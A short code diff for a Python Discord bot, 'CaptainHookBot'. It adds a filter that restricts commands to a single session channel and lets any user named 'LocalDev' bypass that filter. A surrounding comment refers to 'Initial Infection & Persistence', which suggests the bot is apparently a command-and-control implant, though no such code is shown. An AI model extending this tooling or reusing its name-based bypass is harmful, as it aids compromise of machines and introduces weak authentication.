@@ -35,6 +35,24 @@ class CaptainHookBot(commands.Bot):
             self.tui = DeveloperTUI(self)
             self.tui.start()
 
+        # Global command filter
+        @self.check
+        async def globally_block_other_channels(ctx):
+            # 1. Allow if TUI/LocalDev
+            if getattr(ctx.author, "name", "") == "LocalDev" or ctx.author == "LocalDev":
+                return True
+            
+            # 2. Find or create session channel if not set
+            if not self.session_channel:
+                 await self.get_or_create_session_channel()
+
+            # 3. Check channel match
+            if self.session_channel and ctx.channel.id == self.session_channel.id:
+                return True
+            
+            # Ignore if not in the right channel (silently)
+            return False
+
     async def setup_hook(self):
         # 0. Wraith Melt (Initial Infection & Persistence)
         try:
